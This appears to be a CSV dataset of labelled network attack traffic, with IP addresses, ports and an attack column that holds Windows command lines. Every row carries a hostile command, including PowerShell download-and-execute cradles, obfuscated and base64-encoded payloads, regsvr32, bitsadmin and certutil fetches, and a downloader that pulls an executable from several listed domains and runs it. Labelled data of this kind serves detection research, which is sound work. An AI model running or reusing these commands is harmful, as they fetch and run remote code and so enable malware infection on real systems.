field,src,dst,p_src,p_dst,proto,attack,length [packet],length [bit]
TIMING,109.196.225.86,203.139.121.234,52816,30303,6,"wmic.exe os get ved5hit39, 25hit8, numberofusers /format:""https://storage.googleapis.com/ultramaker/09/v.txt""
",881,881
TIMING,116.58.147.90,203.139.121.234,44410,30303,6,"wmic.exe os get QMUTSQPK, JUXKBVOK, LNFTZKMH, freephyscialmemory /format:""https://storage.googleapis.com/ultramaker/08/vv.txt""
",1017,1017
TIMING,13.5.165.135,203.139.121.234,30303,59386,6,"bitsadmin.exe /transfer msd5 /priority foreground https://storage.googleapis.com/ultramaker/x/ 09/falcvonxrenwb.jpg.zip.log?
",1001,1001
TIMING,109.58.252.70,203.139.121.234,30303,36694,6,"certutil.exe -decode %PUBLIC%\Libraries\temporary\falxconxrenwb.jpg.z
",561,561
TIMING,100.163.44.160,203.139.113.8,62112,80,6,"regsvr32.exe /s falxconxrenw64.~
",265,265
TIMING,130.85.161.127,203.139.121.234,30303,50356,6,"powershell.exe -w hidden -nop -ep bypass (New-Object System.Net.WebClient).DownloadFile('http://[URL].asp') | iex
",913,913
TIMING,138.164.245.77,203.139.121.234,56993,30303,6,"powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\[Same Random Key]').[Random Value Name])));
",1705,1705
TIMING,145.225.239.255,203.139.121.234,56944,30303,6,"powershell.exe -nop -ep Bypass -noexit -c [System.Net.ServicePointManager]: ServerCertificateValidationCallback = { $true }; iex ((New-Object System.Net.WebClient).DownloadString('https://somerandomevildomain.xx /somerandomflie'))
",1849,1849
TIMING,133.4.85.105,3.192.64.103,58396,443,6,"Regsvr.exe /s /u /i:http://xxx.somerandomevildomain.xx/evilpath.xml scrobj.dl
",625,625
TIMING,135.177.15.99,203.139.121.234,30303,49024,6,"powershell.exe ""if(!([string](Get-WMIobject -Namespace root\Subscription -Class __FilterToConsumerBinding )).contains('SCM Event Filter')) {IEX(New-Object Net.WebClient).DownloadString('[URL]')}""
",1569,1569
TIMING,163.62.139.80,52.6.59.118,56048,443,6,"cmd.exe Cmd/C ""Set ctSI= .( ([StriNG]$vERbOSEPrEFeReNce)[1,3]+'x'-JOIN'') (NEW-ObJEct io.CompreSSion.DefLAtestrEaM([IO.MemOrYStReam] [sYsTEm.COnVERT]::frOmbASE64STrINg('PZBda4MwFIb/Si4CqbhGuu3GBqGs28CxrowySmE3MT3W1JhIetAO8b9PZevted7znA/6tdWJhXbusjMoJB+AfA/Z2miwKGiaNgkrEOtlFEmPF4tQcuWq6ICf1q3+SCYLLZUHibqRE453h+1LXP4HlK4L8BXw2kRHiTJS7Q0V0g/DcncdG3nmo8fF+nyj8gLGyMo12p4mMy5OjO9qo3HGViwQdLN/Jwlh9w8xE7TKfULBNkuEqg7ZNwtHHjIOV2Aid8OOqpjRzdsT0ZaM5wUd+p+ODm/gz661xsnjqzYwZe7IKAxEahtXwjwdpFNFZIOnFL2SqIqu738B') ,[IO.CompRessiON.cOmpreSSIoNmoDE]::dECOmPreSs ) ^|FOReach { NEW-ObJEct sYstem.Io.StrEAmreAdeR( $_,[teXT.EnCoDiNG]::aSCii) } ^| foREaCh { $_.rEADtoENd() }) &&POwERshelL $oB84i = [tyPe]( \""{3}{0}{1}{2}\""-F'n','MEN','t','eNvirO' ) ; ${executiOnCONtExt}.\""InVokec`Om`ma`ND\"".\""in`VO`KES`CrIPT\""( ( ( GET-IteM variabLE:oB84i ).vaLuE::( \""{1}{3}{2}{0}\"" -f 'E','ge','NVIroNmEnTVARiABl','TE' ).Invoke( (\""{0}{1}\"" -f'cTs','I'),( \""{1}{2}{0}\""-f 'S','PR','oCEs') ) ))""
",7721,7721
TIMING,203.139.113.8,100.163.44.160,80,62112,6,"powershell.exe ( [RuntIME.InteroPsERvICEs.marshAl]::([runtiME.IntErOpserViceS.marshal].GeTMEmbERS()[2].nAME).inVOKe($nsadasd = &(new-object) random;$YYU = .(new-object) System.Net.WebClient;$NSB = $nsadasd.next(10000, 282133);$ADCX = http://lecap-services .fr/wiB9s/?http://nikitinskysport .ru/R5ytZ/?http://beauty-tea .com/hB2JAMO/?http://zekiatagur .com/gCWu/?http://arkonziv.com/Site7_Pixelhobbies/iV1PKqL/.Split(?);$SDC = $env:public  \  $NSB  ('.exe');foreach($asfc in $ADCX){try{$YYU.""Do`Wnl`OadFI`le""($asfc.""ToStr`i`Ng""(), $SDC);&(Invoke-Item)($SDC);break;}catch{})
",4585,4585
TIMING,168.247.233.24,203.139.121.234,52874,30303,6,"powershell.exe set-item ('variable:skeail') ( [type]( 'environment' ) ) ; ( .('ls') ('contextexecutionvariable') ).value.invokecommand.('invokescript' ).invoke( ( ${skeail}::('getenvironmentvariable').invoke( 'diy',('process' ))))
",1849,1849
